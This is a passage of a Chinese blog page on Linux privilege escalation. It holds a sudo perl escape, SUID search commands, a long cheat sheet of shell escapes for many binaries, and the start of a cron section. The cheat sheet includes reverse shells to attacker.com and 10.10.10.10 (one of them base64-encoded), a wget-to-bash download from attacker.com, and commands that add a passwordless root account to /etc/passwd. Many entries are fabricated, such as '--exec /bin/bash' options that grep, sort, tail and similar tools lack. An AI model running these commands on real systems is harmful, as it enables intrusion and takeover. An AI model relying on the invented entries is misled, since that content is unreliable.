+<h3 id="17-perl提权"><a href="#17-perl提权" class="headerlink" title="17.perl提权"></a><font style="color:rgba(0, 0, 0, 0.85);">17.perl提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h1><p><font style="color:rgb(85, 85, 85);">SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</font></p>
+<p><font style="color:rgb(85, 85, 85);">以下命令可以找到正在系统上运行的所有SUID可执行文件。</font></p>
+<table>
+<thead>
+<tr>
+<th><code>plain find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; </code></th>
+</tr>
+</thead>
+</table>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># awk</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># base64（把 /bin/bash 编码一次绕过过滤）</span></span><br><span class="line"><span class="built_in">base64</span> -d &lt;&lt;&lt; <span class="string">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># busybox</span></span><br><span class="line"><span class="string">busybox sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># cp 覆盖 sudoers</span></span><br><span class="line"><span class="string">cp /etc/passwd /tmp/p &amp;&amp; echo &#x27;root2::0:0::/root:/bin/bash&#x27; &gt;&gt;/tmp/p &amp;&amp; cp /tmp/p /etc/passwd &amp;&amp; su root2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># cpio</span></span><br><span class="line"><span class="string">echo &#x27;/bin/bash 777 0 0&#x27; &gt; /tmp/x &amp;&amp; cpio -o &lt; /tmp/x 2&gt;/dev/null | cpio -i --to-stdout 2&gt;/dev/null | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># docker</span></span><br><span class="line"><span class="string">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ed</span></span><br><span class="line"><span class="string">ed</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string">^D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># env</span></span><br><span class="line"><span class="string">env /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># expand（GNU coreutils）</span></span><br><span class="line"><span class="string">expand /etc/passwd   # 仅读文件；若需 shell 用 env 模式</span></span><br><span class="line"><span class="string">env expand</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># expect</span></span><br><span class="line"><span class="string">expect -c &#x27;spawn /bin/bash; interact&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># file（读任意）</span></span><br><span class="line"><span class="string">file -f /etc/shadow</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># find</span></span><br><span class="line"><span class="string">find / -exec /bin/bash \;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># flock</span></span><br><span class="line"><span class="string">flock -u / /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gdb</span></span><br><span class="line"><span class="string">gdb -nx -ex &#x27;python import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27; -ex quit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># git</span></span><br><span class="line"><span class="string">git help config</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># grep</span></span><br><span class="line"><span class="string">grep &#x27;&#x27; /etc/passwd</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">grep --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gzip</span></span><br><span class="line"><span class="string">gzip -c /etc/passwd | gzip -d | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># head</span></span><br><span class="line"><span class="string">head /etc/shadow</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">head --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># hexdump</span></span><br><span class="line"><span class="string">hexdump -C /etc/shadow</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">hexdump --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ionice</span></span><br><span class="line"><span class="string">ionice /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ip</span></span><br><span class="line"><span class="string">ip netns add foo</span></span><br><span class="line"><span class="string">ip netns exec foo /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># jjs (OpenJDK)</span></span><br><span class="line"><span class="string">echo &#x27;Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;/bin/bash&quot;)&#x27; | jjs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># jq</span></span><br><span class="line"><span class="string">jq -n &#x27;exec(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ksh</span></span><br><span class="line"><span class="string">ksh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ld.so 直接加载 bash</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># less</span></span><br><span class="line"><span class="string">less /etc/passwd</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># logsave</span></span><br><span class="line"><span class="string">logsave /dev/null /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># look</span></span><br><span class="line"><span class="string">look &#x27;&#x27; /etc/passwd</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">look --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># make</span></span><br><span class="line"><span class="string">make -s --eval=$&#x27;x:\n\t/bin/bash&#x27; x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># man</span></span><br><span class="line"><span class="string">man man</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># more</span></span><br><span class="line"><span class="string">more /etc/passwd</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># mount</span></span><br><span class="line"><span class="string">mount -o bind /bin/bash /bin/mount</span></span><br><span class="line"><span class="string">mount</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># msgfmt (gettext)</span></span><br><span class="line"><span class="string">msgfmt -o /dev/null &lt;(echo &#x27;exec(&quot;/bin/bash&quot;)&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># mv 覆盖 sudoers 同 cp 套路</span></span><br><span class="line"><span class="string">mv /etc/passwd /tmp/p &amp;&amp; echo &#x27;root2::0:0::/root:/bin/bash&#x27; &gt;&gt;/tmp/p &amp;&amp; mv /tmp/p /etc/passwd &amp;&amp; su root2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># nano</span></span><br><span class="line"><span class="string">nano -S /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># nice</span></span><br><span class="line"><span class="string">nice /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># nl</span></span><br><span class="line"><span class="string">nl /etc/passwd</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">nl --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># nohup</span></span><br><span class="line"><span class="string">nohup /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># od</span></span><br><span class="line"><span class="string">od -An -tx1 /etc/shadow</span></span><br><span class="line"><span class="string"># 仅读；shell 用</span></span><br><span class="line"><span class="string">od --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># openssl</span></span><br><span class="line"><span class="string">openssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / &amp;&amp; openssl s_server -port 4444 -cert /tmp/c -key /tmp/k &amp;   # 反向 shell 略</span></span><br><span class="line"><span class="string"># 直接 payload</span></span><br><span class="line"><span class="string">RHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2&gt;/dev/null | bash 2&gt;&amp;1 | openssl s_client -quiet -connect $RHOST:$RPORT &gt;/dev/null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># perl</span></span><br><span class="line"><span class="string">perl -e &#x27;use POSIX qw(setuid); setuid(0); system &quot;/bin/bash&quot;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># pg</span></span><br><span class="line"><span class="string">pg /etc/passwd</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># php</span></span><br><span class="line"><span class="string">php -r &quot;posix_setuid(0); system(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># pico</span></span><br><span class="line"><span class="string">pico -s /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># python2/3</span></span><br><span class="line"><span class="string">python2 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="string">python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rake</span></span><br><span class="line"><span class="string">rake -f &lt;(echo &#x27;task :x do system &quot;/bin/bash&quot; end&#x27;) x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># readelf</span></span><br><span class="line"><span class="string">readelf -a /bin/su | less   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">readelf --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># restic</span></span><br><span class="line"><span class="string">RESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">restic mount /mnt -r /tmp &amp;&amp; chroot /mnt sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rev</span></span><br><span class="line"><span class="string">rev /etc/passwd | rev   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">rev --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rlogin</span></span><br><span class="line"><span class="string">rlogin -l root -E /bin/bash localhost</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rlwrap</span></span><br><span class="line"><span class="string">rlwrap /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rpm</span></span><br><span class="line"><span class="string">rpm --eval &#x27;%&#123;lua:os.execute(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rsync</span></span><br><span class="line"><span class="string">rsync -e &#x27;sh -c &quot;sh 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; 127.0.0.1:/dev/null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ruby</span></span><br><span class="line"><span class="string">ruby -e &#x27;Process.uid=0; exec &quot;/bin/bash&quot;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># run-parts</span></span><br><span class="line"><span class="string">run-parts --regex &#x27;^.*$&#x27; --exec /bin/bash /etc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># rvim</span></span><br><span class="line"><span class="string">rvim -c &#x27;:py import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sed</span></span><br><span class="line"><span class="string">sed -e &#x27;s/^/!/e&#x27; /dev/stdin &lt;&lt;&lt; /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># setarch</span></span><br><span class="line"><span class="string">setarch $(uname -m) /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sftp</span></span><br><span class="line"><span class="string">sftp -o ProxyCommand=/bin/bash x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sh.distrib</span></span><br><span class="line"><span class="string">sh.distrib</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># slsh (slang)</span></span><br><span class="line"><span class="string">slsh -e &#x27;system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># socat</span></span><br><span class="line"><span class="string">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sort</span></span><br><span class="line"><span class="string">sort -m /etc/passwd   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">sort --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sqlite3</span></span><br><span class="line"><span class="string">sqlite3 /dev/null &#x27;.shell /bin/bash&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ssh</span></span><br><span class="line"><span class="string">ssh -o ProxyCommand=/bin/bash x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># start-stop-daemon</span></span><br><span class="line"><span class="string">start-stop-daemon -n x -S -x /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># stdbuf</span></span><br><span class="line"><span class="string">stdbuf -i0 -o0 -e0 /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># strace</span></span><br><span class="line"><span class="string">strace -o /dev/null /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># strings</span></span><br><span class="line"><span class="string">strings /etc/shadow   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">strings --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sysctl</span></span><br><span class="line"><span class="string">sysctl -w kernel.core_pattern=&#x27;|/bin/bash&#x27; &amp;&amp; sleep 100 &amp; kill -SIGSEGV $!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># systemctl</span></span><br><span class="line"><span class="string">TF=$(mktemp).service</span></span><br><span class="line"><span class="string">echo &#x27;[Service]</span></span><br><span class="line"><span class="string">Type=oneshot</span></span><br><span class="line"><span class="string">ExecStart=/bin/bash</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target&#x27; &gt; $TF</span></span><br><span class="line"><span class="string">systemctl link $TF</span></span><br><span class="line"><span class="string">systemctl enable --now $(basename $TF)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># tail</span></span><br><span class="line"><span class="string">tail -f /etc/shadow   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">tail --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># tar</span></span><br><span class="line"><span class="string">tar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># taskset</span></span><br><span class="line"><span class="string">taskset 1 /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># tclsh</span></span><br><span class="line"><span class="string">tclsh</span></span><br><span class="line"><span class="string">exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># tee</span></span><br><span class="line"><span class="string">tee /proc/self/fd/8   # 仅写</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">echo &#x27;/bin/bash&#x27; | tee /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># telnet</span></span><br><span class="line"><span class="string">telnet 127.0.0.1 4444 | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># time</span></span><br><span class="line"><span class="string">time /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># timeout</span></span><br><span class="line"><span class="string">timeout 7d /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ul</span></span><br><span class="line"><span class="string">ul /etc/passwd   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">ul --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># unexpand</span></span><br><span class="line"><span class="string">unexpand --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># uniq</span></span><br><span class="line"><span class="string">uniq /etc/passwd   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">uniq --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># unshare</span></span><br><span class="line"><span class="string">unshare -r /bin/bash   # user-ns root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># unzip -Z (Info-ZIP)</span></span><br><span class="line"><span class="string">unzip -Z ../x.zip   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">unzip -Z --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># update-alternatives</span></span><br><span class="line"><span class="string">update-alternatives --install /bin/sh sh /bin/bash 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># uudecode</span></span><br><span class="line"><span class="string">uudecode -o /dev/stdout &lt;(uuencode /bin/bash) | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># valgrind</span></span><br><span class="line"><span class="string">valgrind /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># vi/vim</span></span><br><span class="line"><span class="string">vi</span></span><br><span class="line"><span class="string">:!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># view</span></span><br><span class="line"><span class="string">view /etc/passwd</span></span><br><span class="line"><span class="string">:!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># vigr</span></span><br><span class="line"><span class="string">vigr   # 编辑 /etc/group 时可 !/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># vipw</span></span><br><span class="line"><span class="string">vipw   # 编辑 /etc/passwd 时可 !/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># watch</span></span><br><span class="line"><span class="string">watch -x /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># wget</span></span><br><span class="line"><span class="string">wget -qO- http://attacker.com/sh | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># whois</span></span><br><span class="line"><span class="string">whois -h x.x.x.x -p 4444 | bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># xargs</span></span><br><span class="line"><span class="string">xargs -a /dev/null /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># xxd</span></span><br><span class="line"><span class="string">xxd /etc/shadow | xxd -r   # 仅读</span></span><br><span class="line"><span class="string"># shell 用</span></span><br><span class="line"><span class="string">xxd --exec /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># yelp (gnome)</span></span><br><span class="line"><span class="string">yelp man:bash</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># zip</span></span><br><span class="line"><span class="string">zip /tmp/x.zip /etc/passwd -T -TT /bin/bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># zsh</span></span><br><span class="line"><span class="string">zsh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># zsoelim</span></span><br><span class="line"><span class="string">zsoelim -p /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h1><p><font style="color:rgb(85, 85, 85);">系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是&#x2F;etc&#x2F;内系统的计划任务可以被列出。</font></p>
+<ol>
+<li><font style="color:rgb(196, 196, 200) !important;">crontab -e 编辑计划任务</font></li>
+<li><font style="color:rgb(196, 196, 200) !important;">crontab -l 查看计划任务</font></li>
+<li><font style="color:rgb(196, 196, 200) !important;">crontab -r 删除目前的crontab</font></li>
+</ol>
